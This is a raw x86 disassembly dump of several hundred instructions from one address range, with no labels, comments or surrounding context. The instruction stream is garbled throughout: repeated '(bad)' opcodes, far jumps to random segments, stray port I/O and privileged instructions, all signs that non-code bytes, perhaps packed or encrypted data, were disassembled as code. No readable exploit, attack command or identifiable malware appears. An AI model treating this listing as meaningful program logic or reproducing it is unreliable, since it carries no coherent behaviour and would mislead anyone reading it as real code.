  4194c9:	inc    edi
  4194ca:	btr    esi,ebp
  4194cd:	jmp    DWORD PTR gs:[ecx]
  4194d0:	(bad)  
  4194d1:	mov    esp,cs
  4194d3:	ins    BYTE PTR es:[edi],dx
  4194d4:	mov    dl,0x44
  4194d6:	pop    ss
  4194d7:	sub    eax,0xddcc70ad
  4194dc:	push   0xb3d59efb
  4194e1:	or     BYTE PTR [ebp-0x2e],0xfd
  4194e5:	cmp    esi,DWORD PTR [eax+0x3f]
  4194e8:	or     eax,0x9b35b4a7
  4194ed:	lds    ebx,FWORD PTR [ebx+0x44b12a4a]
  4194f3:	ja     0x41953f
  4194f5:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4194f7:	aas    
  4194f8:	xchg   DWORD PTR [ebx+0x2909b8c3],ebp
  4194fe:	sbb    BYTE PTR [ecx],dl
  419500:	outs   dx,DWORD PTR ds:[esi]
  419501:	sbb    ah,0x2b
  419504:	cmc    
  419505:	and    al,0x5
  419507:	in     eax,0xe
  419509:	mov    ebp,0x97526ef6
  41950e:	(bad)  
  41950f:	cmp    bl,ch
  419511:	dec    al
  419513:	add    DWORD PTR [eax-0x68],edi
  419516:	cwde   
  419517:	dec    edi
  419518:	pop    ebp
  419519:	jmp    0x743a:0x55965cec
  419520:	sub    dh,BYTE PTR [ebx-0x50268fd7]
  419526:	data16 jl 0x419564
  419529:	sbb    ecx,DWORD PTR [edi+0x3d]
  41952c:	(bad)  
  41952d:	popa   
  41952e:	fdivr  DWORD PTR [eax+eiz*2+0x10]
  419532:	xor    DWORD PTR [ecx+0x23],0x68
  419536:	sub    eax,0x5c94fc0b
  41953b:	and    BYTE PTR [edx+0x34],cl
  41953e:	mov    dl,0x8d
  419540:	sti    
  419541:	(bad)  
  419542:	dec    esi
  419543:	or     dl,dl
  419545:	or     al,0x5c
  419547:	adc    ax,0x5251
  41954b:	test   al,0x3f
  41954d:	sbb    al,0x88
  41954f:	and    ah,dl
  419551:	xlat   BYTE PTR ds:[ebx]
  419552:	mov    ch,0xae
  419554:	jecxz  0x4195d1
  419556:	outs   dx,DWORD PTR ds:[esi]
  419557:	add    BYTE PTR [edi-0x78],dh
  41955a:	mov    bh,0xeb
  41955c:	pop    eax
  41955d:	imul   edi,DWORD PTR [edx+0x56dc4848],0xffffff9c
  419564:	inc    ecx
  419565:	ins    DWORD PTR es:[edi],dx
  419566:	loopne 0x419530
  419568:	das    
  419569:	push   ds
  41956a:	lock inc eax
  41956c:	xor    ch,BYTE PTR [ecx-0x128c0cb0]
  419572:	iret   
  419573:	jmp    0x4195e1
  419575:	push   edi
  419576:	push   esp
  419577:	xor    DWORD PTR [eax],edx
  419579:	mov    ebx,0x20cac111
  41957e:	xchg   ecx,eax
  41957f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419580:	mov    eax,ds:0xab7d96f5
  419585:	aaa    
  419586:	arpl   WORD PTR [esi+esi*1-0x1],cx
  41958a:	and    DWORD PTR [eax+0x7f],0x14
  41958e:	test   DWORD PTR [esi-0x214a5e40],edx
  419594:	popa   
  419595:	in     al,0xd5
  419597:	cmp    dh,BYTE PTR cs:[esi+0xb469cc2]
  41959e:	mov    bh,0x5b
  4195a0:	jmp    0x41953c
  4195a2:	or     al,0xfe
  4195a4:	mov    DWORD PTR ds:0xc774f459,esi
  4195aa:	mov    esi,0xa16da3e1
  4195af:	in     eax,dx
  4195b0:	or     al,0x84
  4195b2:	jmp    0xac41:0x276b38d4
  4195b9:	xor    BYTE PTR [eax-0x58],dh
  4195bc:	iret   
  4195bd:	ss or  eax,0xf7b84ce3
  4195c3:	and    eax,0xf8e91b5
  4195c8:	pop    ss
  4195c9:	(bad)  
  4195ca:	scas   eax,DWORD PTR es:[edi]
  4195cb:	das    
  4195cc:	inc    ecx
  4195cd:	mov    al,BYTE PTR [ebp+0x61402a02]
  4195d3:	dec    eax
  4195d4:	adc    bh,BYTE PTR [esp]
  4195d7:	add    ah,BYTE PTR [esi]
  4195d9:	(bad)
  4195dc:	mov    bh,0x50
  4195de:	int3   
  4195df:	retf   
  4195e0:	shr    DWORD PTR [ebp+0x77],cl
  4195e3:	mov    ebx,0x84c3e366
  4195e8:	mov    eax,0xfd70d64c
  4195ed:	pop    ss
  4195ee:	mov    dl,0x23
  4195f0:	icebp  
  4195f1:	repnz cwde 
  4195f3:	jmp    0x999ce78a
  4195f8:	fstp   DWORD PTR [ebp+0x6a1e4d2a]
  4195fe:	sbb    eax,0x402a3c25
  419603:	mov    ch,0x58
  419605:	inc    edx
  419606:	in     al,dx
  419607:	stos   BYTE PTR es:[edi],al
  419608:	pop    eax
  419609:	adc    BYTE PTR [eax+0x3d],ch
  41960c:	lahf   
  41960d:	lods   al,BYTE PTR ds:[si]
  41960f:	pop    edi
  419610:	mov    ds:0x8bb51682,eax
  419615:	(bad)
  419618:	clc    
  419619:	(bad)  
  41961a:	jno    0x4195e2
  41961c:	cwde   
  41961d:	add    al,0xc1
  41961f:	pop    edi
  419620:	mov    al,0xc3
  419622:	dec    esp
  419623:	and    BYTE PTR ss:[esi],0xdf
  419627:	sub    edi,ebx
  419629:	sti    
  41962a:	cmp    DWORD PTR [esi+eiz*4-0x4e871c71],esp
  419631:	or     BYTE PTR [ecx],dl
  419633:	xchg   esp,eax
  419634:	ins    BYTE PTR es:[edi],dx
  419635:	jl     0x4195cb
  419637:	inc    ebp
  419638:	push   esp
  419639:	ds sub al,0xad
  41963c:	or     DWORD PTR [eax+ebp*2],0xfe40da69
  419643:	addr16 add ah,ch
  419646:	fdivr  DWORD PTR [edx+0x3f2c2f16]
  41964c:	pop    ecx
  41964d:	sbb    ah,ch
  41964f:	rcl    DWORD PTR ds:0x59f0e5f6,cl
  419655:	jb     0x41966d
  419657:	xor    ah,BYTE PTR [ebp-0x1ebd0634]
  41965d:	loope  0x419667
  41965f:	dec    edi
  419660:	mov    ebp,0xf1e9052b
  419665:	ds (bad) 
  419667:	fwait
  419668:	jmp    0xbfad:0x1309d5a7
  41966f:	popa   
  419670:	xchg   ebp,eax
  419671:	rcl    DWORD PTR [ebp+0x58],cl
  419674:	jle    0x41961e
  419676:	cmp    eax,0x357c663e
  41967b:	daa    
  41967c:	pop    DWORD PTR [ecx-0x7a5c4cfd]
  419682:	xchg   esi,eax
  419683:	ficom  WORD PTR [ecx-0xd6e475e]
  419689:	cwde   
  41968a:	mov    ds:0xaa1e2772,eax
  41968f:	ins    BYTE PTR es:[edi],dx
  419690:	add    eax,0xb52822de
  419695:	lahf   
  419696:	ds push ebx
  419698:	enter  0xfa2b,0xbe
  41969c:	stos   BYTE PTR es:[edi],al
  41969d:	test   DWORD PTR [edx+0x31],edx
  4196a0:	shr    BYTE PTR [edi+ecx*2-0x4e3ebb2a],cl
  4196a7:	push   edi
  4196a8:	dec    ebx
  4196a9:	dec    ecx
  4196aa:	fisttp QWORD PTR [eax-0xa]
  4196ad:	dec    esp
  4196ae:	mov    esp,0x8cfd429b
  4196b3:	aam    0xed
  4196b5:	mov    ds,WORD PTR [ebx-0x38]
  4196b8:	jns    0x41965f
  4196ba:	out    0xec,al
  4196bc:	icebp  
  4196bd:	adc    cl,BYTE PTR [ebx]
  4196bf:	dec    esp
  4196c0:	sahf   
  4196c1:	ins    BYTE PTR es:[edi],dx
  4196c2:	stc    
  4196c3:	dec    edx
  4196c4:	mov    ds:0x3d8861c,eax
  4196c9:	ret    
  4196ca:	lods   eax,DWORD PTR ds:[esi]
  4196cb:	and    BYTE PTR [ebx],ah
  4196cd:	fadd   QWORD PTR [ebx+eiz*1+0x6c1d6e84]
  4196d4:	or     DWORD PTR [edx+0x20],ebx
  4196d7:	sub    al,BYTE PTR [ebx-0x257dc13d]
  4196dd:	or     eax,0x5a111171
  4196e2:	dec    eax
  4196e3:	aas    
  4196e4:	icebp  
  4196e5:	nop
  4196e6:	mov    esi,DWORD PTR [ebp-0xc]
  4196e9:	test   BYTE PTR [eax+0xd],bl
  4196ec:	out    0xc7,al
  4196ee:	sbb    bl,al
  4196f0:	jmp    0xaa3:0x5339b5c7
  4196f7:	push   0xf3bd1d33
  4196fc:	jnp    0x419774
  4196fe:	outs   dx,DWORD PTR ds:[esi]
  4196ff:	das    
  419700:	adc    DWORD PTR [esi],0x1b02c4e1
  419706:	cmp    WORD PTR [edi+0x6b],0x5c
  41970b:	jp     0x419761
  41970d:	jne    0x419748
  41970f:	(bad)  
  419710:	adc    eax,0x5c2fcac
  419715:	jnp    0x4196a7
  419717:	fcomp  QWORD PTR [esi-0x22229215]
  41971d:	and    edi,edx
  41971f:	pusha  
  419720:	je     0x4196eb
  419722:	sar    DWORD PTR [edx+ecx*2+0x7b],1
  419726:	leave  
  419727:	jge    0x41974b
  419729:	push   esi
  41972a:	leave  
  41972b:	adc    BYTE PTR [ebp-0xd],cl
  41972e:	adc    BYTE PTR [ebx-0x6f10b1bc],0x62
  419735:	fadd   QWORD PTR ds:0x76460873
  41973b:	sbb    eax,0xcc1e89b7
  419740:	shr    DWORD PTR [eax-0x1d6d4794],cl
  419746:	es test al,0x30
  419749:	or     esp,DWORD PTR [ecx]
  41974b:	dec    esp
  41974c:	push   0x978dd237
  419751:	sbb    dl,al
  419753:	dec    edi
  419754:	daa    
  419755:	mov    ebx,0x3130293d
  41975a:	xlat   BYTE PTR ds:[ebx]
  41975b:	xor    eax,eax
  41975d:	jne    0x419726
  41975f:	frstor [ebp+0x3ccc7938]
  419765:	enter  0x9e22,0xef
  419769:	jae    0x419779
  41976b:	cmp    BYTE PTR [ebp+0x39859dad],ah
  419771:	dec    esp
  419772:	outs   dx,DWORD PTR ds:[esi]
  419773:	jno    0x4197e9
  419775:	loop   0x4197c8
  419777:	gs std 
  419779:	stos   BYTE PTR es:[edi],al
  41977a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41977b:	jno    0x41972e
  41977d:	adc    ecx,DWORD PTR [eax]
  41977f:	popa   
  419780:	arpl   WORD PTR [eax-0x5bf57d0],sp
  419786:	inc    ecx
  419787:	adc    BYTE PTR [edx+0x2d79aa8a],cl
  41978d:	mov    edi,0xad1f2a7a
  419792:	mov    bl,0x17
  419794:	out    0x6f,eax
  419796:	push   edi
  419797:	mov    ds:0x5bb2951f,eax
  41979c:	iret   
  41979d:	xor    eax,0x6b05af21
  4197a2:	test   esi,edx
  4197a4:	push   esp
  4197a5:	push   ss
  4197a6:	jp     0x4197e5
  4197a8:	es aad 0x38
  4197ab:	aas    
  4197ac:	test   al,0x88
  4197ae:	inc    ebp
  4197af:	call   0x65cf:0xdcd9ac52
  4197b6:	xchg   edx,eax
  4197b7:	mov    eax,ds:0x6485e8ab
  4197bc:	rol    BYTE PTR [edi],cl
  4197be:	js     0x419749
  4197c0:	popf   
  4197c1:	shl    BYTE PTR [ebx+0x6a],cl
  4197c4:	sub    eax,0x34bfdb5f
  4197c9:	div    BYTE PTR [edi]
  4197cb:	stc    
  4197cc:	adc    eax,0x7f322c15
  4197d1:	sbb    DWORD PTR ds:0x51497bcc,0xda532c64
  4197db:	icebp  
  4197dc:	xchg   ecx,eax
  4197dd:	fiadd  DWORD PTR [ebx]
  4197df:	and    BYTE PTR [ebp+edi*2-0x5e22d45],0x4f
  4197e7:	and    DWORD PTR [ebx-0x4083c381],esp
  4197ed:	shr    BYTE PTR [edx-0x6f8c81ca],0xa4
  4197f4:	jle    0x41980f
  4197f6:	loope  0x419875
  4197f8:	xchg   BYTE PTR [ebp-0x5b],ah
  4197fb:	hlt    
  4197fc:	(bad)  
  4197fd:	jp     0x41985c
  4197ff:	or     ch,ch
  419801:	test   eax,0xdb7479b6
  419806:	in     eax,0xbf
  419808:	fdiv   DWORD PTR [esi+eiz*2+0x4bac7c49]
  41980f:	lds    ecx,FWORD PTR [ecx-0x2a592ddb]
  419815:	pop    esi
  419816:	and    BYTE PTR [esi-0x1f13aead],cl
  41981c:	in     al,dx
  41981d:	movhps xmm6,QWORD PTR [ebx]
  419820:	fnstenv [ebp-0x5332b33c]
  419826:	sub    BYTE PTR [esi],0xdc
  419829:	rcl    BYTE PTR [ebp+0x7f],0xd8
  41982d:	add    DWORD PTR [ebx],edx
  41982f:	jl     0x4198a6
  419831:	imul   eax,edx,0x41525075
  419837:	outs   dx,BYTE PTR ds:[esi]
  419838:	call   0x8fd0c334
  41983d:	(bad)  
  41983e:	or     al,0x54
  419840:	enter  0x467b,0x1a
  419844:	pop    edi
  419845:	xchg   ecx,eax
  419846:	push   ecx
  419847:	in     al,0x12
  419849:	xchg   ebp,esi
  41984b:	sub    BYTE PTR [edx-0x36],dl
  41984e:	fbld   TBYTE PTR [edi+0x1d059e3a]
  419854:	mov    al,ds:0x1faa97e1
  419859:	sub    dl,BYTE PTR [ebx+0x1ee58fd6]
  41985f:	add    bh,BYTE PTR [esi]
  419861:	and    eax,0xff267cdd
  419866:	fstp   TBYTE PTR ds:[ebx+eiz*2]
  41986a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41986b:	xchg   ebp,eax
  41986c:	lds    esi,FWORD PTR [esi+0x54da12e2]
  419872:	sbb    BYTE PTR [ecx+ecx*1+0x34],dl
  419876:	push   ds
  419877:	push   0x661d026d
  41987c:	mov    ds:0x91ab9ef,al
  419881:	lahf   
  419882:	(bad)  
  419884:	cmp    BYTE PTR [ebx+ebx*1+0x3],al
  419888:	iret   
  419889:	in     eax,0x72
  41988b:	jne    0x419814
  41988d:	jns    0x4198fc
  41988f:	movd   mm6,DWORD PTR [esi+0x10a58e7b]
  419896:	cmp    DWORD PTR [ebx-0x1f1ff85f],ecx
  41989c:	cmp    BYTE PTR [ecx+0x441f26d5],bl
  4198a2:	scas   eax,DWORD PTR es:[edi]
  4198a3:	adc    DWORD PTR [edx],ebx
  4198a5:	lea    edi,[esi-0x7f35e2ae]
  4198ab:	mov    ebx,0xbc8c0e65
  4198b0:	xor    DWORD PTR [esi-0x36ebf476],eax
  4198b6:	add    al,0x9d
  4198b8:	sbb    eax,0x8b2d4e47
  4198bd:	dec    ebp
  4198be:	outs   dx,DWORD PTR ds:[esi]
  4198bf:	daa    
  4198c0:	arpl   cx,sp
  4198c2:	or     al,0xc7
  4198c4:	repz pop ebx
  4198c6:	add    eax,0xf077ee9e
  4198cb:	xchg   esp,eax
  4198cc:	or     ebp,DWORD PTR [edi]
  4198ce:	pop    es
  4198cf:	out    dx,eax
  4198d0:	jbe    0x419927
  4198d2:	test   edi,eax
  4198d4:	dec    esi
  4198d5:	mov    esp,0xa873cf3d
  4198da:	xor    ah,ah
  4198dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198dd:	mov    ebx,0x5773ba79
  4198e2:	and    al,0x94
  4198e4:	popf   
  4198e5:	xlat   BYTE PTR ds:[ebx]
  4198e6:	pop    es
  4198e7:	push   cs
  4198e8:	sar    DWORD PTR [ebx],0x4f
  4198eb:	dec    esp
  4198ec:	jle    0x4198e9
  4198ee:	(bad)  
  4198ef:	push   edi
  4198f0:	cdq    
  4198f1:	retf   0xda1e
  4198f4:	cs mov al,0x8f
  4198f7:	bound  edx,QWORD PTR [ebp+0x1d]
  4198fa:	lahf   
  4198fb:	adc    BYTE PTR [esi],ah
  4198fd:	pop    ebp
  4198fe:	xor    DWORD PTR [ecx+edx*4-0x2da79a10],esi
  419905:	cmp    al,0x72
  419907:	mov    edx,0xb83b472
  41990c:	retf   0xf55f
  41990f:	dec    ecx
  419910:	mov    ds:0x998f7c12,eax
  419915:	lahf   
  419916:	inc    edi
  419917:	dec    esi
  419918:	ins    DWORD PTR es:[edi],dx
  419919:	scas   eax,DWORD PTR es:[edi]
  41991a:	or     edi,DWORD PTR [ebp+0x2b4318ed]
  419920:	mov    eax,0x50a1d318
  419925:	xor    ah,ch
  419927:	or     eax,DWORD PTR [ecx-0x58]
  41992a:	enter  0x37c3,0x52
  41992e:	out    dx,eax
  41992f:	aaa    
  419930:	into   
  419931:	fst    DWORD PTR [eax]
  419933:	cs xor al,0x8c
  419936:	test   DWORD PTR [edx+0x69],ebx
  419939:	dec    edi
  41993a:	cmp    bl,BYTE PTR [ebx]
  41993c:	jo     0x41999a
  41993e:	push   esp
  41993f:	push   ecx
  419940:	xor    eax,0x79b8ee15
  419945:	call   0xddf1:0xe78a36b9
  41994c:	repz repz mov bl,BYTE PTR [esi]
  419950:	add    eax,0x714d9838
  419955:	jg     0x419913
  419957:	(bad)  
  419958:	push   0xb
  41995a:	and    al,0xda
  41995c:	mov    ds:0xd29622de,eax
  419961:	stos   BYTE PTR es:[edi],al
  419962:	inc    ebx
  419963:	cmp    DWORD PTR [ecx-0x1a],0x1a40cc2b
  41996a:	loope  0x41997d
  41996c:	imul   BYTE PTR [edx]
  41996e:	ins    DWORD PTR es:[edi],dx
  41996f:	sbb    ch,BYTE PTR [ecx]
  419971:	in     al,0x83
  419973:	add    al,0x30
  419975:	and    BYTE PTR [eax+0x7edcc803],ch
  41997b:	call   0xb67b1af7
  419980:	aaa    
  419981:	test   DWORD PTR [edx],ebp
  419983:	sub    DWORD PTR [edx+0x56],esi
  419986:	imul   esp,DWORD PTR [ebx],0x54
  419989:	rol    BYTE PTR [eax-0x4c],cl
  41998c:	inc    eax
  41998d:	(bad)  
  41998e:	stos   DWORD PTR es:[edi],eax
  41998f:	inc    edi
  419990:	jo     0x419a07
  419992:	into   
  419993:	lock or al,0xf0
  419996:	pop    ebx
  419997:	pop    ecx
  419998:	mov    ebp,0x84f1404b
  41999d:	fnstenv [esi+0x5b]
  4199a0:	nop
  4199a1:	aaa    
  4199a2:	daa    
  4199a3:	int    0xa2
  4199a5:	fistp  WORD PTR [ebx+0x989d48c]
  4199ab:	add    BYTE PTR [edi-0x38],0x37
  4199af:	fbstp  TBYTE PTR [ecx+0x74]
  4199b2:	imul   eax,esp,0xfdebface
  4199b8:	dec    eax
  4199b9:	jge    0x419941
  4199bb:	sub    esi,DWORD PTR [ecx]
  4199bd:	pop    edi
  4199be:	fild   DWORD PTR [ecx]
  4199c0:	bound  esp,QWORD PTR [ebx+0x47]
  4199c3:	nop
  4199c4:	stos   BYTE PTR es:[edi],al
  4199c5:	pop    ds
  4199c6:	es out dx,al
  4199c8:	das    
  4199c9:	aam    0x3
  4199cb:	fstp   st(5)
  4199cd:	fbstp  TBYTE PTR [ebx]
  4199cf:	push   cs
  4199d0:	loopne 0x419977
  4199d2:	bound  edx,QWORD PTR [edx+edx*8]
  4199d5:	xor    eax,0x1f30d91
  4199da:	and    BYTE PTR [ebp-0x7d],dh
  4199dd:	fmul   DWORD PTR [eax+0x24]
  4199e0:	mov    ebx,0x855d239d
  4199e5:	lods   eax,DWORD PTR ds:[esi]
  4199e6:	adc    bl,bl
  4199e8:	jg     0x419989
  4199ea:	dec    esp
  4199eb:	and    DWORD PTR [ecx],ecx
  4199ed:	jnp    0x4199c9
  4199ef:	and    al,0xb5
  4199f1:	inc    esi
  4199f2:	cmp    ch,BYTE PTR [ebx-0x4beab62f]
  4199f8:	aam    0x75
  4199fa:	or     DWORD PTR [esi-0x2d],edx
  4199fd:	aas    
  4199fe:	std    
  4199ff:	xchg   DWORD PTR [esi+esi*8+0x598aa2b9],ebp
  419a06:	push   ecx
  419a07:	xchg   edx,eax
  419a08:	loope  0x419a20
  419a0a:	es clc 
  419a0c:	inc    ecx
  419a0d:	into   
  419a0e:	out    dx,eax
  419a0f:	(bad)  
  419a10:	call   DWORD PTR [edi]
  419a12:	ret    
  419a13:	or     eax,0xd05a91d6
  419a18:	mov    ecx,0x38a40dc6
  419a1d:	bnd jmp 0x419a0b
  419a20:	and    eax,0x1ac827c9
  419a25:	std    
  419a26:	icebp  
  419a27:	push   edi
  419a28:	inc    BYTE PTR [edx+0x39a9e316]
  419a2e:	test   al,0x54
  419a30:	xchg   ebx,eax
  419a31:	add    ah,BYTE PTR [eax]
  419a33:	xchg   ebp,eax
  419a34:	sub    al,BYTE PTR [edx+0x14]
  419a37:	sbb    esp,DWORD PTR [eax-0x7b30fa35]
  419a3d:	repz sbb ebx,ebp
  419a40:	scas   al,BYTE PTR es:[edi]
  419a41:	and    dh,BYTE PTR [edi]
  419a43:	mov    bh,0xe0
  419a45:	(bad)
  419a49:	push   ds
  419a4a:	rol    dl,1
  419a4c:	lahf   
  419a4d:	gs mov bl,0x61
  419a50:	in     al,dx
  419a51:	nop
  419a52:	lods   al,BYTE PTR ds:[esi]
  419a53:	add    eax,0x405d39e3
  419a58:	cmp    al,0xc4
  419a5a:	shr    DWORD PTR [eax+0x3c47cc46],0xa2
  419a61:	cmp    DWORD PTR [ecx],edx
  419a63:	add    DWORD PTR [edx-0x70],ecx
  419a66:	test   eax,0xd2844032
  419a6b:	jb     0x419a9c
  419a6d:	ds ins BYTE PTR es:[edi],dx
  419a6f:	adc    al,0x4b
  419a71:	or     dh,BYTE PTR [edi+0x4e4ec8a4]
  419a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a78:	sub    DWORD PTR [ebx+0x3600ab6a],esp
  419a7e:	in     al,0xbb
  419a80:	imul   ecx,ebx,0xffffff98
  419a83:	rcl    BYTE PTR [esi+0x64f42ece],0x53
  419a8a:	sub    dh,BYTE PTR [edi+0x7db97f70]
  419a90:	xlat   BYTE PTR ds:[ebx]
  419a91:	aas    
  419a92:	scas   al,BYTE PTR es:[edi]
  419a93:	sub    DWORD PTR [ecx+0x26],esi
  419a96:	enter  0x3ef7,0xac
  419a9a:	je     0x419a7b
  419a9c:	pusha  
  419a9d:	rcr    BYTE PTR ds:0x8cee50c6,cl
  419aa3:	dec    edx
  419aa4:	call   0x476fa859
  419aa9:	ficom  WORD PTR [esi]
  419aab:	push   edx
  419aac:	sub    BYTE PTR [ebx],0x0
  419aaf:	psubsb mm5,QWORD PTR [edx+0xfb6a94b]
  419ab6:	fwait
  419ab7:	pop    ebp
  419ab8:	pop    edi
  419ab9:	adc    al,bh
  419abb:	push   cs
  419abc:	not    DWORD PTR [edi-0x11]
  419abf:	mul    BYTE PTR [ebx+0x35]
  419ac2:	stc    
  419ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ac4:	outs   dx,DWORD PTR ds:[esi]
  419ac5:	cmp    al,0xd9
  419ac7:	and    eax,edx
  419ac9:	xor    eax,0xf6670878
  419ace:	adc    eax,0xc816437a
  419ad3:	js     0x419ae1
  419ad5:	xchg   DWORD PTR [edi-0x81121eb],eax
  419adb:	cmp    edx,DWORD PTR [ecx-0x43]
  419ade:	mov    bh,bh
  419ae0:	sub    eax,0x9ad2dc9b
  419ae5:	mov    eax,0xbbb56744
  419aea:	loopne 0x419b2b
  419aec:	mov    dx,0x3988
  419af0:	js     0x419b2c
  419af2:	retf   
  419af3:	xor    al,0x2
  419af5:	jae    0x419af2
  419af7:	in     eax,0x3
  419af9:	mov    DWORD PTR [ecx],edx
  419afb:	sti    
  419afc:	les    eax,FWORD PTR [edi-0xa]
  419aff:	(bad)  
  419b00:	mov    edi,0xccd7a160
  419b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b06:	push   ebp
  419b07:	in     eax,0x59
  419b09:	(bad)  
  419b0a:	repz enter 0x962,0x5b
  419b0f:	mov    ds:0xd5f0713a,al
  419b14:	xchg   DWORD PTR [edx+0x3c],ecx
  419b17:	mov    al,0xf1
  419b19:	dec    edx
  419b1a:	xor    al,0x92
  419b1c:	xor    al,0x77
  419b1e:	mov    ebx,0xdbcd0803
  419b23:	xchg   edi,eax
  419b24:	ja     0x419ae9
  419b26:	out    dx,eax
  419b27:	mov    gs,ecx
  419b29:	and    DWORD PTR [edx+0x544d96e6],eax
  419b2f:	fld    TBYTE PTR [ecx-0x1a]
  419b32:	or     eax,0xfaffcbd8
  419b37:	dec    edx
  419b38:	xor    DWORD PTR [ebp+0x72ca4632],esp
  419b3e:	std    
  419b3f:	jp     0x419ae6
  419b41:	shl    BYTE PTR [edx+ebp*1+0x6a],1
  419b45:	fxch   st(4)
  419b47:	pop    esp
  419b48:	jp     0x419b5b
  419b4a:	mov    ds:0xc9fc65db,al
  419b4f:	repz dec edi
  419b51:	data16 fsubr QWORD PTR ds:[edi+ebx*1]
  419b56:	cli    
  419b57:	in     al,dx
  419b58:	add    bh,BYTE PTR [ebx+0x6760d4fb]
  419b5e:	iret   
  419b5f:	jl     0x419b86
  419b61:	popf   
  419b62:	shl    ch,1
  419b64:	imul   DWORD PTR [ecx]
  419b66:	xchg   edx,eax
  419b67:	les    ebx,FWORD PTR [ecx]
  419b69:	jmp    0x636a8a5a
  419b6e:	(bad)  
  419b6f:	sub    ecx,ebx
  419b71:	cmp    DWORD PTR [eax],esp
  419b73:	dec    ebx
  419b74:	imul   esi,DWORD PTR [esi-0x78],0x48a4a853
  419b7b:	ds call 0x45067f99
  419b81:	loope  0x419b3c
  419b83:	fadd   st(2),st
  419b85:	add    al,0x7d
  419b87:	icebp  
  419b88:	push   eax
  419b89:	es (bad) 
  419b8b:	pop    ebx
  419b8c:	push   esi
  419b8d:	push   ds
  419b8e:	adc    eax,0x7610b1d
  419b93:	int3   
  419b94:	sbb    BYTE PTR [esi],bh
  419b96:	jnp    0x419b2c
  419b98:	outs   dx,BYTE PTR ds:[esi]
  419b99:	(bad)  
  419b9b:	push   ss
  419b9c:	outs   dx,BYTE PTR ds:[esi]
  419b9d:	repnz test DWORD PTR [ebp-0x54],esp
  419ba1:	imul   esi,DWORD PTR [eax-0x693fae26],0x1ef7d8ca
  419bab:	fidiv  WORD PTR [esi+edi*2-0x2b]
  419baf:	dec    esp
  419bb0:	add    bl,BYTE PTR [ecx]
  419bb2:	adc    ch,cl
  419bb4:	sub    edx,0x454995a8
  419bba:	out    0x39,al
  419bbc:	and    eax,0xde2f0f9f
  419bc1:	clc    
  419bc2:	std    
  419bc3:	cli    
  419bc4:	or     BYTE PTR [edx+0x75],al
  419bc7:	jo     0x419baa
  419bc9:	jae    0x419c18
  419bcb:	(bad)
  419bce:	mov    ds:0x9e52992a,al
  419bd3:	leave  
  419bd4:	shr    edx,0x8a
  419bd7:	pop    es
  419bd8:	bound  ebp,QWORD PTR [edi+0x11]
  419bdb:	loope  0x419bde
  419bdd:	and    eax,0x2bcac749
  419be2:	add    eax,0x839f2f68
  419be7:	into   
  419be8:	mov    fs:0x2a70b1aa,al
  419bee:	loope  0x419be7
  419bf0:	dec    esp
  419bf1:	pop    es
  419bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bf3:	pop    eax
  419bf4:	add    DWORD PTR [esi+ecx*4-0x672ac301],ebx
  419bfb:	and    eax,0x40780df5
  419c00:	stos   BYTE PTR es:[edi],al
  419c01:	or     edx,esp
  419c03:	outs   dx,DWORD PTR ds:[esi]
  419c04:	xor    ch,ah
  419c06:	cmc    
  419c07:	retf   
  419c08:	inc    edx
  419c09:	or     edi,esp
  419c0b:	(bad)  
  419c0c:	pusha  
  419c0d:	rcl    DWORD PTR [esi+esi*1+0x67],0x12
  419c12:	repnz inc edx
  419c14:	scas   eax,DWORD PTR es:[edi]
  419c15:	lgs    esi,FWORD PTR [edx+0x7d]
  419c19:	push   ecx
  419c1a:	pop    DWORD PTR [eax+0x1c]
  419c1d:	xor    dh,BYTE PTR fs:[ebp+eax*4-0x334507d2]
  419c25:	and    eax,0xcdc1e2d4
  419c2a:	dec    esp
  419c2b:	xchg   ecx,eax
  419c2c:	push   cs
  419c2d:	fbstp  TBYTE PTR [ebp+ebx*1+0x2c]
  419c31:	push   es
  419c32:	push   ss
  419c33:	pop    edx
  419c34:	shl    DWORD PTR [ecx],cl
  419c36:	arpl   WORD PTR [ebp-0x7935f2a1],si
  419c3c:	ins    DWORD PTR es:[edi],dx
  419c3d:	popa   
  419c3e:	(bad)  
  419c3f:	lods   al,BYTE PTR ds:[esi]
  419c40:	adc    al,0xdf
  419c42:	inc    edi
  419c43:	mov    ds:0x5c6d6bd2,al
  419c48:	lds    edi,FWORD PTR [edi-0x4027a0d4]
  419c4e:	xor    BYTE PTR [edx+esi*8+0x2f],0x16
  419c53:	cmp    al,0x15
  419c55:	sbb    ah,BYTE PTR [esi]
  419c57:	jbe    0x419ca6
  419c59:	aad    0xfe
  419c5b:	cmp    cl,BYTE PTR [esi-0x37]
  419c5e:	jno    0x419cbf
  419c60:	popf   
  419c61:	popa   
  419c62:	dec    ebp
  419c63:	and    DWORD PTR ds:0x4b45d81c,ebx
  419c69:	bound  ebx,QWORD PTR [eax-0x6bc65c6f]
  419c6f:	xchg   edi,eax
  419c70:	ret    0x4aa3
  419c73:	inc    edi
  419c74:	(bad)  
  419c75:	(bad)  
  419c76:	std    
  419c77:	int3   
  419c78:	repz ret 
  419c7a:	mov    DWORD PTR [edi],edi
  419c7c:	cs push edx
  419c7e:	fcomp  QWORD PTR [ecx]
  419c80:	jle    0x419ce2
  419c82:	jmp    0x6dd0:0x45af9af6
  419c89:	shl    DWORD PTR [edx+0xc],cl
  419c8c:	pop    ebx
  419c8d:	dec    esp
  419c8e:	cld    
  419c8f:	fidivr DWORD PTR [ecx+0x157dd04c]
  419c95:	sbb    eax,0x16cfd0d0
  419c9a:	shl    DWORD PTR [esi+edi*4-0xe],cl
  419c9e:	push   ebx
  419c9f:	inc    ebx
  419ca0:	and    BYTE PTR [ebx-0x24],0xe0
  419ca4:	cwde   
  419ca5:	mov    bh,0x18
  419ca7:	add    al,0x33
  419ca9:	test   eax,0x6a6f3900
  419cae:	nop
  419caf:	push   0x2
  419cb1:	cli    
  419cb2:	and    BYTE PTR [ebp-0x64],ah
  419cb5:	push   ds
  419cb6:	test   ah,dh
  419cb8:	inc    edi
  419cb9:	int    0x60
  419cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
